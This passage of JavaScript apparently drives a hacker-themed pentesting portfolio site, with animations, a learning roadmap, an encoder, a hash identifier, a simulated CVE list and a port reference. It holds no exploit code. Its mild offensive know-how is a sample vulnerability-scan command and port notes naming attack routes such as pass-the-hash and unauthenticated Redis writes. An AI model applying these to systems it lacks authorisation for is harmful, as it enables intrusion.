   DATA — KEYBOARD SHORTCUTS
   ============================================================ */
const KB_SHORTCUTS = [
  { key: "?", desc: "open this panel" },
  { key: "G+H", desc: "go to hero" },
  { key: "G+W", desc: "go to whoami" },
  { key: "G+R", desc: "go to roadmap" },
  { key: "G+T", desc: "go to tutorials" },
  { key: "G+A", desc: "go to arsenal" },
  { key: "G+X", desc: "go to toolbox" },
  { key: "G+N", desc: "go to field notes" },
  { key: "ESC", desc: "close any panel" },
  { key: "G+C", desc: "go to contact" },
];

/* ============================================================
   BOOT SEQUENCE
   ============================================================ */
(function () {
  const boot = document.getElementById("boot"),
    line = document.getElementById("bootLine"),
    skip = document.getElementById("bootSkip");
  const reduce = matchMedia("(prefers-reduced-motion:reduce)").matches;
  const seq = [
    "> establishing connection ........ <span class='ok'>OK</span>",
    "> mounting /dev/fsociety ......... <span class='ok'>OK</span>",
    "> loading arsenal ............... <span class='ok'>OK</span>",
    "> decrypting field notes ........ <span class='ok'>OK</span>",
    "> parsing attack trees .......... <span class='ok'>OK</span>",
    "> access granted. <span class='hot'>hello, friend.</span>",
  ];
  let done = false;
  function finish() {
    if (done) return;
    done = true;
    boot.classList.add("gone");
    setTimeout(() => boot.remove(), 600);
  }
  skip.addEventListener("click", finish);
  if (reduce) {
    line.innerHTML = seq[seq.length - 1];
    setTimeout(finish, 500);
    return;
  }
  let i = 0;
  (function step() {
    if (i >= seq.length) {
      setTimeout(finish, 650);
      return;
    }
    line.innerHTML = seq[i];
    i++;
    setTimeout(step, 360);
  })();
  setTimeout(finish, 3400);
})();

/* ============================================================
   HERO TERMINAL
   ============================================================ */
(function () {
  const cmd = document.getElementById("hcmd"),
    out = document.getElementById("hout");
  if (!cmd) return;
  const reduce = matchMedia("(prefers-reduced-motion:reduce)").matches;
  const C = [
    {
      c: "whoami",
      o: ["armanxploits", "4th-yr eng · ethical hacker · pentester"],
    },
    { c: "cat /etc/hostname", o: ["fsociety"] },
    {
      c: "systemctl status learning",
      o: ["● active (running) — recon→operator", "clearance climbing..."],
    },
    {
      c: "nmap --script vuln 192.168.1.0/24",
      o: [
        "Starting Nmap 7.95 ( https://nmap.org )",
        "PORT    STATE SERVICE",
        "22/tcp  open  ssh OpenSSH 8.9",
        "80/tcp  open  http Apache 2.4.52",
        "443/tcp open  https",
        "Nmap done: 256 IPs scanned",
      ],
    },
    {
      c: "echo $MISSION",
      o: ["break it to understand it. secure it to matter."],
    },
  ];
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  async function type(t) {
    cmd.textContent = "";
    for (const ch of t) {
      cmd.textContent += ch;
      await sleep(reduce ? 0 : 38);
    }
  }
  async function show(lines) {
    for (const l of lines) {
      const d = document.createElement("div");
      d.className =
        "out" +
        (l.includes("mission") || l.includes("clearance") ? " hot" : "");
      d.textContent = "→ " + l;
      out.appendChild(d);
      await sleep(reduce ? 0 : 110);
    }
  }
  (async function loop() {
    let i = 0;
    await sleep(900);
    while (true) {
      const x = C[i % C.length];
      await type(x.c);
      await sleep(380);
      await show(x.o);
      await sleep(1900);
      if (i % C.length === C.length - 1) {
        await sleep(400);
        out.innerHTML = "";
      }
      i++;
      cmd.textContent = "";
      await sleep(260);
    }
  })();
})();

/* ============================================================
   HERO NETWORK CANVAS
   ============================================================ */
(function () {
  const cv = document.getElementById("netcanvas");
  if (!cv) return;
  if (matchMedia("(prefers-reduced-motion:reduce)").matches) return;
  const ctx = cv.getContext("2d");
  function size() {
    cv.width = cv.offsetWidth;
    cv.height = cv.offsetHeight;
  }
  size();
  addEventListener("resize", size);
  const N = 46,
    pts = Array.from({ length: N }, () => ({
      x: Math.random() * cv.width,
      y: Math.random() * cv.height,
      vx: (Math.random() - 0.5) * 0.3,
      vy: (Math.random() - 0.5) * 0.3,
    }));
  function frame() {
    ctx.clearRect(0, 0, cv.width, cv.height);
    for (let i = 0; i < N; i++) {
      const p = pts[i];
      for (let j = i + 1; j < N; j++) {
        const q = pts[j],
          dx = p.x - q.x,
          dy = p.y - q.y,
          d = Math.hypot(dx, dy);
        if (d < 130) {
          ctx.strokeStyle = `rgba(216,57,43,${0.05 * (1 - d / 130)})`;
          ctx.lineWidth = 0.5;
          ctx.beginPath();
          ctx.moveTo(p.x, p.y);
          ctx.lineTo(q.x, q.y);
          ctx.stroke();
        }
      }
      ctx.fillStyle = "rgba(207,202,187,.25)";
      ctx.fillRect(p.x, p.y, 1.4, 1.4);
      p.x += p.vx;
      p.y += p.vy;
      if (p.x < 0 || p.x > cv.width) p.vx *= -1;
      if (p.y < 0 || p.y > cv.height) p.vy *= -1;
    }
    requestAnimationFrame(frame);
  }
  frame();
})();

/* ============================================================
   THREAT TICKER
   ============================================================ */
(function () {
  const track = document.getElementById("tickerTrack");
  if (!track) return;
  const items = [...THREATS, ...THREATS];
  track.innerHTML = items
    .map(
      (t) => `
    <span class="tick-item">
      <span class="tsev ${t.sev}">${t.sev.toUpperCase()}</span>
      ${t.txt}
    </span>
    <span class="tick-sep">|</span>
  `,
    )
    .join("");
})();

/* ============================================================
   RENDER: tools, repos, notes
   ============================================================ */
(function () {
  document.getElementById("arsenalGrid").innerHTML = TOOLS.map(
    (t) => `
    <div class="panel tool" data-cat="${t.c}">
      <div class="tname">${t.n}</div>
      <div class="tdesc">${t.d}</div>
      <div class="tmeta"><span class="tag">${t.t}</span><span class="tstat ${t.s}">${t.st}</span></div>
    </div>`,
  ).join("");

  const fmtStars = (n) =>
    n >= 1000
      ? (n / 1000).toFixed(n >= 10000 ? 0 : 1).replace(/\.0$/, "") + "k"
      : "" + n;
  document.getElementById("commRepos").innerHTML = REPOS.filter(
    (r) => r.featured,
  )
    .slice(0, 3)
    .map(
      (r) => `
    <a class="repo" href="https://github.com/${r.owner}/${r.repo}" target="_blank" rel="noopener">
      <div class="rname">${r.owner} / ${r.repo}</div>
      <div class="rdesc">${r.desc}</div>
      <div class="rmeta"><span class="tag">${r.lang}</span><span class="star">★ ${fmtStars(r.stars)}</span></div>
    </a>`,
    )
    .join("");

  document.getElementById("notebody").innerHTML = Object.entries(NOTES)
    .map(
      ([k, v], idx) => `
    <div class="npage${idx === 0 ? " on" : ""}" data-n="${k}">
      <h3>// ${v.title}</h3>
      <div class="nmeta">${v.meta}</div>
      ${v.secs.map((s) => `<div class="nsec"><h4>${s.h}</h4>${s.code ? `<div class="code-wrap"><pre class="code"><code>${s.code.replace(/</g, "&lt;")}</code></pre><button class="copy-btn" data-code="${encodeURIComponent(s.code)}">copy</button></div>` : ""}${s.list ? `<ul class="nlist">${s.list.map((li) => `<li>${li}</li>`).join("")}</ul>` : ""}</div>`).join("")}
    </div>`,
    )
    .join("");
})();

/* ============================================================
   TUTORIALS RENDER
   ============================================================ */
(function () {
  const grid = document.getElementById("tutContent");
  const cats = document.querySelectorAll(".tcat");
  function renderCat(cat) {
    const data = TUTORIALS[cat] || [];
    grid.innerHTML = data
      .map(
        (t, i) => `
      <div class="tut-card" data-idx="${i}">
        <div class="tut-card-head">
          <span class="diff ${t.diff}">${t.diff === "beg" ? "BEGINNER" : t.diff === "int" ? "INTERMEDIATE" : "ADVANCED"}</span>
          <h3>${t.title}</h3>
          <span class="tut-toggle">▶</span>
        </div>
        <div class="tut-card-body">
          <p class="tut-desc">${t.desc}</p>
          ${t.warn ? `<div class="tut-warn"><b>⚠ SCOPE WARNING:</b> ${t.warn}</div>` : ""}
          <div class="tut-steps">
            ${t.steps
              .map(
                (s) => `
              <div class="tut-step">
                <div class="step-inner">
                  <h4>${s.h}</h4>
                  <p>${s.p}</p>
                  ${s.code ? `<div class="code-wrap"><pre class="code"><code>${s.code.replace(/</g, "&lt;")}</code></pre><button class="copy-btn" data-code="${encodeURIComponent(s.code)}">copy</button></div>` : ""}
                </div>
              </div>`,
              )
              .join("")}
          </div>
          <div class="tut-tags">${t.tags.map((tag) => `<span class="tag">${tag}</span>`).join("")}</div>
        </div>
      </div>`,
      )
      .join("");
    // bind toggles
    grid.querySelectorAll(".tut-card-head").forEach((h) => {
      h.onclick = () => h.parentElement.classList.toggle("open");
    });
    bindCopy(grid);
  }
  cats.forEach(
    (b) =>
      (b.onclick = () => {
        cats.forEach((x) => x.classList.remove("on"));
        b.classList.add("on");
        renderCat(b.dataset.cat);
      }),
  );
  renderCat("recon");
})();

/* SVG renderer replaced by animated top-down tree below */

/* ============================================================
   ROADMAP
   ============================================================ */
const RM = (function () {
  const KEY = "fsoc_cleared_v1";
  let cleared = new Set();
  try {
    const s = localStorage.getItem(KEY);
    if (s) cleared = new Set(JSON.parse(s));
  } catch (e) {}
  const ALL = [];
  PHASES.forEach((p) => p.nodes.forEach((n) => ALL.push(n)));
  function save() {
    try {
      localStorage.setItem(KEY, JSON.stringify([...cleared]));
    } catch (e) {}
  }
  const chain = document.getElementById("chain");
  function render() {
    chain.innerHTML = PHASES.map((p) => {
      const done = p.nodes.every((n) => cleared.has(n.id));
      const got = p.nodes.filter((n) => cleared.has(n.id)).length;
      return `<div class="phase ${done ? "done" : ""}" data-code="${p.code}">
        <div class="phase-head">
          <span class="station"></span>
          <span class="phase-code">${p.code}</span>
          <span class="phase-title">${p.title}</span>
          <span class="phase-sub">${p.sub}</span>
        </div>
        <div class="nodes">
          ${p.nodes
            .map(
              (
                n,
              ) => `<button class="node ${cleared.has(n.id) ? "cleared" : ""}" data-id="${n.id}" data-track="${n.track}">
            <span class="ntop"><span class="dot"></span><span class="nl">${n.label}</span></span>
            <span class="nb">${n.blurb}</span>
            <span class="ntrack">${n.track}</span>
          </button>`,
            )
            .join("")}
        </div>
        <div class="phase-prog" style="margin-left:0;margin-top:8px;font-size:.62rem;color:var(--ash)">${got}/${p.nodes.length} cleared</div>
      </div>`;
    }).join("");
    updateMeter();
  }
  function updateMeter() {
    const pct = Math.round((cleared.size / ALL.length) * 100);
    document.getElementById("clearPct").textContent = pct + "%";
    document.getElementById("clearBar").style.width = pct + "%";
  }
  function node(id) {
    return ALL.find((n) => n.id === id);
  }
  function toggle(id) {
    cleared.has(id) ? cleared.delete(id) : cleared.add(id);
    save();
    render();
    bindNodes();
    return cleared.has(id);
  }
  function isClear(id) {
    return cleared.has(id);
  }
  function reset() {
    if (confirm("Reset all roadmap progress?")) {
      cleared.clear();
      save();
      render();
      bindNodes();
    }
  }
  function filter(track) {
    document.querySelectorAll(".node").forEach((el) => {
      el.classList.toggle("dim", track !== "all" && el.dataset.track !== track);
    });
  }
  let bindNodes;
  return {
    render,
    node,
    toggle,
    isClear,
    reset,
    filter,
    setBind: (f) => (bindNodes = f),
  };
})();

/* ============================================================
   DOSSIER
   ============================================================ */
(function () {
  RM.render();
  const dossier = document.getElementById("dossier"),
    scrim = document.getElementById("dosScrim");
  const dTitle = document.getElementById("dosTitle"),
    dKick = document.getElementById("dosKicker");
  const dBody = document.getElementById("dosBody"),
    dClear = document.getElementById("dosClear");
  let current = null;
  function open(id) {
    const n = RM.node(id);
    if (!n) return;
    current = id;
    dKick.textContent =
      n.track === "found"
        ? "foundation"
        : n.track === "off"
          ? "offensive skill"
          : n.track === "practice"
            ? "practice ground"
            : "career";
    dTitle.textContent = n.label;
    dBody.innerHTML = `
      <h4>brief</h4><p>${n.blurb}</p>
      <h4>why it matters</h4><p>${n.why}</p>
      <h4>key topics</h4><div class="dos-topics">${n.topics.map((t) => `<span class="tag">${t}</span>`).join("")}</div>
      <h4>where to learn</h4><div class="dos-res">${n.res.map((r) => `<a href="${r.u}" target="_blank" rel="noopener">${r.n}<span class="arr">↗</span></a>`).join("")}</div>`;
    syncBtn();
    dossier.classList.add("open");
    scrim.classList.add("open");
    dossier.setAttribute("aria-hidden", "false");
  }
  function syncBtn() {
    const on = RM.isClear(current);
    dClear.textContent = on ? "✓ cleared — undo" : "mark as cleared";
    dClear.classList.toggle("is-clear", on);
  }
  function close() {
    dossier.classList.remove("open");
    scrim.classList.remove("open");
    dossier.setAttribute("aria-hidden", "true");
    current = null;
  }
  function bindNodes() {
    document
      .querySelectorAll(".node")
      .forEach((el) => (el.onclick = () => open(el.dataset.id)));
  }
  RM.setBind(bindNodes);
  bindNodes();
  dClear.onclick = () => {
    if (current) {
      RM.toggle(current);
      syncBtn();
    }
  };
  document.getElementById("dosClose").onclick = close;
  scrim.onclick = close;
  addEventListener("keydown", (e) => {
    if (e.key === "Escape") close();
  });
  document.querySelectorAll("#rmFilters .fbtn[data-track]").forEach(
    (b) =>
      (b.onclick = () => {
        document
          .querySelectorAll("#rmFilters .fbtn[data-track]")
          .forEach((x) => x.classList.remove("on"));
        b.classList.add("on");
        RM.filter(b.dataset.track);
      }),
  );
  document.getElementById("rmReset").onclick = RM.reset;
})();

/* ============================================================
   INTERACTIVE TOOLBOX
   ============================================================ */
(function () {
  /* --- Payload Encoder / Decoder --- */
  const encInput = document.getElementById("encInput");
  const encOut = document.getElementById("encOut");
  const encTabs = document.querySelectorAll(".enc-tab");
  let encMode = "b64";
  encTabs.forEach(
    (t) =>
      (t.onclick = () => {
        encTabs.forEach((x) => x.classList.remove("on"));
        t.classList.add("on");
        encMode = t.dataset.enc;
      }),
  );
  document.getElementById("encBtn").onclick = () => {
    const val = encInput.value;
    if (!val) {
      encOut.textContent = "// no input";
      return;
    }
    try {
      if (encMode === "b64")
        encOut.textContent = btoa(unescape(encodeURIComponent(val)));
      else if (encMode === "b64d")
        encOut.textContent = decodeURIComponent(escape(atob(val)));
      else if (encMode === "url") encOut.textContent = encodeURIComponent(val);
      else if (encMode === "urld") encOut.textContent = decodeURIComponent(val);
      else if (encMode === "hex")
        encOut.textContent = [...val]
          .map((c) => c.charCodeAt(0).toString(16).padStart(2, "0"))
          .join(" ");
      else if (encMode === "html")
        encOut.textContent = val
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;");
      encOut.classList.remove("err");
    } catch (e) {
      encOut.textContent = "// error: " + e.message;
      encOut.classList.add("err");
    }
  };
  document.getElementById("encCopy").onclick = () =>
    copyToClipboard(encOut.textContent, document.getElementById("encCopy"));

  /* --- Hash Identifier --- */
  const hashInput = document.getElementById("hashInput");
  const hashOut = document.getElementById("hashOut");
  const HASH_TYPES = [
    { len: 8, name: "CRC-32" },
    { len: 16, name: "MySQL 3.x / DES" },
    { len: 32, name: "MD5 / NTLM / MD4" },
    { len: 40, name: "SHA-1 / MySQL 4.1+" },
    { len: 56, name: "SHA-224" },
    { len: 64, name: "SHA-256 / BLAKE2 / Keccak-256" },
    { len: 96, name: "SHA-384" },
    { len: 128, name: "SHA-512 / BLAKE2b-512" },
  ];
  document.getElementById("hashBtn").onclick = () => {
    const h = hashInput.value.trim().replace(/\s/g, "");
    if (!h) {
      hashOut.innerHTML = "// paste a hash";
      return;
    }
    const len = h.length;
    const hex = /^[0-9a-fA-F]+$/.test(h);
    const bcrypt = /^\$2[aby]?\$/.test(h);
    const md5crypt = /^\$1\$/.test(h);
    const sha512crypt = /^\$6\$/.test(h);
    let html = "";
    if (bcrypt) html += `<span class="hash-pill">bcrypt</span>`;
    if (md5crypt) html += `<span class="hash-pill">md5crypt ($1$)</span>`;
    if (sha512crypt) html += `<span class="hash-pill">sha512crypt ($6$)</span>`;
    if (hex) {
      const matches = HASH_TYPES.filter((t) => t.len === len);
      matches.forEach(
        (m) =>
          (html += `<span class="hash-pill">${m.name} (${len} chars)</span>`),
      );
      if (!matches.length)
        html += `<span class="hash-pill">Unknown hex — length ${len}</span>`;
    }
    if (!html) html = `<span class="hash-pill">Non-hex — check format</span>`;
    hashOut.innerHTML = html;
  };

  /* --- CVE Lookup (simulated) --- */
  const CVE_DB = [
    {
      id: "CVE-2021-44228",
      score: 10,
      sev: "crit",
      desc: "Apache Log4j2 JNDI injection — Log4Shell. Remote code execution via specially crafted log messages.",
    },
    {
      id: "CVE-2021-45046",
      score: 9,
      sev: "high",
      desc: "Log4j2 context lookup bypass — incomplete fix for Log4Shell in certain non-default configs.",
    },
    {
      id: "CVE-2022-22965",
      score: 9.8,
      sev: "crit",
      desc: "Spring Framework RCE — Spring4Shell. DataBinder exploitation via ClassLoader on JDK 9+.",
    },
    {
      id: "CVE-2023-23397",
      score: 9.8,
      sev: "crit",
      desc: "Microsoft Outlook NTLM credential theft via crafted calendar invites. Zero-click.",
    },
    {
      id: "CVE-2024-3400",
      score: 10,
      sev: "crit",
      desc: "Palo Alto PAN-OS GlobalProtect OS command injection — unauthenticated RCE.",
    },
    {
      id: "CVE-2023-4863",
      score: 8.8,
      sev: "high",
      desc: "libwebp heap buffer overflow in BuildHuffmanTable. Affects Chrome, Electron, many apps.",
    },
    {
      id: "CVE-2024-21887",
      score: 9.1,
      sev: "crit",
      desc: "Ivanti Connect Secure command injection. Chained with CVE-2023-46805 for unauthenticated RCE.",
    },
    {
      id: "CVE-2024-6387",
      score: 8.1,
      sev: "high",
      desc: "OpenSSH regreSSHion — race condition in signal handler. Unauthenticated RCE on glibc Linux.",
    },
    {
      id: "CVE-2017-0144",
      score: 8.1,
      sev: "high",
      desc: "EternalBlue — SMBv1 RCE. Used by WannaCry and NotPetya ransomware campaigns.",
    },
    {
      id: "CVE-2023-38545",
      score: 9.8,
      sev: "crit",
      desc: "curl SOCKS5 heap-based buffer overflow in SOCKS5 proxy handshake.",
    },
    {
      id: "CVE-2024-27198",
      score: 9.8,
      sev: "crit",
      desc: "JetBrains TeamCity authentication bypass — unauthenticated admin account creation.",
    },
    {
      id: "CVE-2024-1709",
      score: 10,
      sev: "crit",
      desc: "ConnectWise ScreenConnect authentication bypass via path traversal in setup wizard.",
    },
  ];
  document.getElementById("cveBtn").onclick = () => {
    const q = document.getElementById("cveInput").value.trim().toLowerCase();
    const out = document.getElementById("cveOut");
    if (!q) {
      out.innerHTML = '<div class="tbox-out">// enter CVE ID or keyword</div>';
      return;
    }
    const results = CVE_DB.filter(
      (c) => c.id.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q),
    ).slice(0, 4);
    if (!results.length) {
      out.innerHTML =
        '<div class="tbox-out err">// no results in local db — check NVD</div>';
      return;
    }
    out.innerHTML = results
      .map(
        (c) => `
      <div class="cve-result">
        <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px">
          <div class="cve-id">${c.id}</div>
          <span class="cve-score score-${c.sev}">CVSS ${c.score}</span>
        </div>
        <div class="cve-desc">${c.desc}</div>
      </div>`,
      )
      .join("");
  };
  document.getElementById("cveInput").addEventListener("keydown", (e) => {
    if (e.key === "Enter") document.getElementById("cveBtn").click();
  });

  /* --- Regex Tester --- */
  const regInput = document.getElementById("regInput");
  const regPattern = document.getElementById("regPattern");
  const regFlags = document.getElementById("regFlags");
  const regOut = document.getElementById("regOut");
  function runRegex() {
    const text = regInput.value;
    const pat = regPattern.value;
    if (!pat) {
      regOut.innerHTML = text.replace(/</g, "&lt;");
      return;
    }
    try {
      const re = new RegExp(pat, regFlags.value || "g");
      let html = text.replace(/</g, "&lt;");
      const matches = [
        ...text.matchAll(
          new RegExp(
            pat,
            regFlags.value.includes("g")
              ? regFlags.value
              : regFlags.value + "g",
          ),
        ),
      ];
      if (matches.length) {
        html = text
          .replace(/</g, "&lt;")
          .replace(
            new RegExp(pat.replace(/</g, "&lt;"), regFlags.value || "g"),
            (m) =>
              `<mark class="regex-match">${m.replace(/</g, "&lt;")}</mark>`,
          );
        regOut.innerHTML =
          html +
          '<div style="margin-top:8px;font-size:.65rem;color:var(--phosphor)">//' +
          matches.length +
          " match" +
          (matches.length > 1 ? "es" : "") +
          "</div>";
      } else {
        regOut.innerHTML =
          html +
          '<div style="margin-top:8px;font-size:.65rem;color:var(--ash)">// no matches</div>';
      }
      regOut.classList.remove("err");
    } catch (e) {
      regOut.textContent = "// regex error: " + e.message;
      regOut.classList.add("err");
    }
  }
  [regInput, regPattern, regFlags].forEach(
    (el) => el && el.addEventListener("input", runRegex),
  );

  /* --- Port Reference --- */
  const COMMON_PORTS = [
    {
      p: 21,
      svc: "FTP",
      notes: "File transfer — often misconfigured, anonymous login",
    },
    {
      p: 22,
      svc: "SSH",
      notes: "Secure shell — brute-force target, check version",
    },
    { p: 23, svc: "Telnet", notes: "Cleartext — almost always a finding" },
    { p: 25, svc: "SMTP", notes: "Mail — open relay, user enumeration" },
    { p: 53, svc: "DNS", notes: "Zone transfer attempt — dig AXFR" },
    { p: 80, svc: "HTTP", notes: "Web — start web recon chain" },
    { p: 139, svc: "NetBIOS", notes: "SMB precursor — enum4linux" },
    { p: 443, svc: "HTTPS", notes: "Web TLS — check cert for subdomains" },
    { p: 445, svc: "SMB", notes: "EternalBlue, relay attacks, pass-the-hash" },
    { p: 1433, svc: "MSSQL", notes: "SQL Server — check for sa account" },
    { p: 3306, svc: "MySQL", notes: "Database — check remote access" },
    { p: 3389, svc: "RDP", notes: "Remote Desktop — bluekeep, brute-force" },
    { p: 5985, svc: "WinRM", notes: "Windows Remote Mgmt — evil-winrm" },
    {
      p: 6379,
      svc: "Redis",
      notes: "Often unauthenticated — config file write",
    },
    { p: 8080, svc: "HTTP-Alt", notes: "Dev/proxy — check for admin panels" },
    { p: 27017, svc: "MongoDB", notes: "NoSQL — often no auth in dev envs" },
  ];
  document.getElementById("portTable").innerHTML = `
    <table class="port-table">
      <thead><tr><th>Port</th><th>Service</th><th>Pentest Notes</th></tr></thead>
      <tbody>${COMMON_PORTS.map((p) => `<tr><td class="open">${p.p}</td><td>${p.svc}</td><td>${p.notes}</td></tr>`).join("")}</tbody>
    </table>`;
})();

/* ============================================================
   COPY TO CLIPBOARD HELPER
   ============================================================ */
function copyToClipboard(text, btn) {
  navigator.clipboard
    .writeText(text)
    .then(() => {
      if (btn) {
        btn.textContent = "copied!";
        btn.classList.add("copied");
        setTimeout(() => {
          btn.textContent = "copy";
          btn.classList.remove("copied");
        }, 1800);
      }
    })
    .catch(() => {});
}

function bindCopy(root = document) {
  root.querySelectorAll(".copy-btn").forEach((btn) => {
    btn.onclick = () => {
      const code = decodeURIComponent(btn.dataset.code || "");
      copyToClipboard(code, btn);
    };
  });
}

/* ============================================================
   KEYBOARD SHORTCUTS
   ============================================================ */
(function () {
  const overlay = document.getElementById("kbOverlay");
  const kbBtn = document.getElementById("kbBtn");
  const NAV_MAP = {
    h: "#hero",
    w: "#whoami",
    r: "#roadmap",
    t: "#tutorials",
    a: "#arsenal",
    x: "#toolbox",
    n: "#notes",
    c: "#contact",
  };
  let gPressed = false,
    gTimer = null;
  function openKb() {
    overlay.classList.add("open");
  }
  function closeKb() {
    overlay.classList.remove("open");
  }
  kbBtn && kbBtn.addEventListener("click", openKb);
  overlay.addEventListener("click", (e) => {
    if (e.target === overlay) closeKb();
  });
  document.addEventListener("keydown", (e) => {
    if (
      document.activeElement &&
      ["INPUT", "TEXTAREA", "SELECT"].includes(document.activeElement.tagName)
    )
      return;
    if (e.key === "?") {
      openKb();
      return;
    }
    if (e.key === "Escape") {
      closeKb();
      return;
    }
    if (e.key.toLowerCase() === "g") {
      gPressed = true;
      clearTimeout(gTimer);
      gTimer = setTimeout(() => (gPressed = false), 1200);
      return;
    }
    if (gPressed && NAV_MAP[e.key.toLowerCase()]) {
      const el = document.querySelector(NAV_MAP[e.key.toLowerCase()]);
      if (el) el.scrollIntoView({ behavior: "smooth", block: "start" });
      gPressed = false;
    }
  });
  // render shortcuts
  const kbGrid = document.getElementById("kbGrid");
  if (kbGrid) {
    kbGrid.innerHTML = KB_SHORTCUTS.map(
      (s) =>
        `<div class="kb-row"><span class="desc">${s.desc}</span><span class="key">${s.key}</span></div>`,
    ).join("");
  }
})();

/* ============================================================
   ARSENAL FILTER + NOTE TABS + NAV + REVEAL + COUNTERS
   ============================================================ */
(function () {
  // arsenal filter
  const ab = document.querySelectorAll("#afilter .fbtn");
  ab.forEach(
    (b) =>
      (b.onclick = () => {
        ab.forEach((x) => x.classList.remove("on"));
        b.classList.add("on");
        const f = b.dataset.f;
        document
          .querySelectorAll(".tool")
          .forEach((t) =>
            t.classList.toggle("hide", f !== "all" && t.dataset.cat !== f),
          );
      }),
  );
  // note tabs
  const nt = document.querySelectorAll(".ntab");
  nt.forEach(
    (t) =>
      (t.onclick = () => {
        nt.forEach((x) => x.classList.remove("on"));
        t.classList.add("on");
        document
          .querySelectorAll(".npage")
          .forEach((p) =>
            p.classList.toggle("on", p.dataset.n === t.dataset.n),
          );
      }),
  );
  // nav solidify + burger
  const nav = document.getElementById("nav");
  addEventListener("scroll", () => nav.classList.toggle("solid", scrollY > 40));
  const burger = document.getElementById("burger"),
    spread = document.getElementById("navSpread");
  burger.onclick = () => spread.classList.toggle("open");
  spread
    .querySelectorAll("a")
    .forEach((a) => (a.onclick = () => spread.classList.remove("open")));
  // active nav link
  const links = [...document.querySelectorAll(".nav-spread a")];
  const secObs = new IntersectionObserver(
    (es) =>
      es.forEach((e) => {
        if (e.isIntersecting) {
          links.forEach((l) =>
            l.classList.toggle("on", l.dataset.s === e.target.id),
          );
        }
      }),
    { threshold: 0.35, rootMargin: "-20% 0px -50% 0px" },
  );
  document
    .querySelectorAll("main section, header#hero")
    .forEach((s) => secObs.observe(s));
  // reveal
  const rev = new IntersectionObserver(
    (es) =>
      es.forEach((e) => {
        if (e.isIntersecting) {
          e.target.classList.add("in");
          rev.unobserve(e.target);
        }
      }),
    { threshold: 0.12 },
  );
  document.querySelectorAll(".rev").forEach((el) => rev.observe(el));
  // counters
  const cObs = new IntersectionObserver(
    (es) =>
      es.forEach((e) => {
        if (e.isIntersecting) {
          const el = e.target,
            to = +el.dataset.to;
          let c = 0;
          const step = to / 40;
          (function up() {
            c = Math.min(c + step, to);
            el.textContent = Math.floor(c);
            if (c < to) requestAnimationFrame(up);
          })();
          cObs.unobserve(el);
        }
      }),
    { threshold: 0.6 },
  );
  document.querySelectorAll(".hstat .n").forEach((el) => cObs.observe(el));
  // smooth scroll
  document.querySelectorAll('a[href^="#"]').forEach((a) =>
    a.addEventListener("click", (e) => {
      const t = document.querySelector(a.getAttribute("href"));
      if (t) {
        e.preventDefault();
        t.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    }),
  );
  // bind copy on initial notes render
  bindCopy();
})();

console.log(
  "%c fsociety // armanxploits — hello, friend. ",
  "color:#d8392b;font-weight:bold;font-size:14px",
);
console.log(
  "%c press ? for keyboard shortcuts",
  "color:#5f7a5b;font-size:11px",
);
/* ============================================================
   MR ROBOT CURSOR TRAIL
   ============================================================ */
(function () {
  const canvas = document.createElement("canvas");
  canvas.id = "cursor-trail-canvas";
  document.body.appendChild(canvas);
  const ctx = canvas.getContext("2d");
  let W, H;
  function resize() {
    W = canvas.width = window.innerWidth;
    H = canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener("resize", resize);

  const COLORS = [
    "#ff2d2d",
    "#ff5555",
    "#ff0000",
    "#ff9900",
    "#00e5ff",
    "#39ff7e",
    "#bf5fff",
  ];
  const particles = [];
  let mx = -999,
    my = -999;

  document.addEventListener("mousemove", (e) => {
    mx = e.clientX;
    my = e.clientY;
    // spawn trail particles
    for (let i = 0; i < 2; i++) {
      particles.push({
        x: mx + (Math.random() - 0.5) * 6,
        y: my + (Math.random() - 0.5) * 6,
        vx: (Math.random() - 0.5) * 2.5,
        vy: (Math.random() - 0.5) * 2.5 - 0.5,
        life: 1,
        decay: 0.04 + Math.random() * 0.04,
        size: 1.5 + Math.random() * 2.5,
        color: COLORS[Math.floor(Math.random() * 3)], // mostly reds
        isChar: Math.random() < 0.12,
        char: "01▸◈◉⬡▪".split("")[Math.floor(Math.random() * 7)],
      });
    }
    // occasional glitch char burst
    if (Math.random() < 0.04) {
      for (let i = 0; i < 5; i++) {
        particles.push({
          x: mx + (Math.random() - 0.5) * 40,
          y: my + (Math.random() - 0.5) * 20,
          vx: (Math.random() - 0.5) * 5,
          vy: (Math.random() - 0.5) * 4 - 1,
          life: 1,
          decay: 0.08,
          size: 1,
          color: COLORS[Math.floor(Math.random() * COLORS.length)],
          isChar: true,
          char: "01▸▪◈".split("")[Math.floor(Math.random() * 5)],
        });
      }
    }
  });

  // Click burst
  document.addEventListener("click", (e) => {
    for (let i = 0; i < 18; i++) {
      const angle = ((Math.PI * 2) / 18) * i + Math.random() * 0.5;
      const speed = 2 + Math.random() * 5;
      particles.push({
        x: e.clientX,
        y: e.clientY,
        vx: Math.cos(angle) * speed,
        vy: Math.sin(angle) * speed,
        life: 1,
        decay: 0.03 + Math.random() * 0.04,
        size: 1 + Math.random() * 3,
        color: COLORS[Math.floor(Math.random() * COLORS.length)],
        isChar: Math.random() < 0.3,
        char: "!▸◈01".split("")[Math.floor(Math.random() * 5)],
      });
    }
  });

  // Draw cursor dot
  const CURSOR_R = 5;

  function loop() {
    ctx.clearRect(0, 0, W, H);

    // cursor ring
    if (mx > 0) {
      ctx.beginPath();
      ctx.arc(mx, my, CURSOR_R + 3, 0, Math.PI * 2);
      ctx.strokeStyle = "rgba(255,45,45,.6)";
      ctx.lineWidth = 1;
      ctx.stroke();
      ctx.beginPath();
      ctx.arc(mx, my, CURSOR_R, 0, Math.PI * 2);
      ctx.fillStyle = "rgba(255,45,45,.9)";
      ctx.fill();
    }

    for (let i = particles.length - 1; i >= 0; i--) {
      const p = particles[i];
      p.x += p.vx;
      p.y += p.vy;
      p.vy += 0.08; // gravity
      p.life -= p.decay;
      if (p.life <= 0) {
        particles.splice(i, 1);
        continue;
      }
      ctx.globalAlpha = p.life * 0.9;
      if (p.isChar) {
        ctx.font = `${Math.floor(p.size * 4)}px "JetBrains Mono", monospace`;
        ctx.fillStyle = p.color;
        ctx.fillText(p.char, p.x, p.y);
      } else {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
        ctx.fillStyle = p.color;
        ctx.fill();
        // glow
        ctx.beginPath();
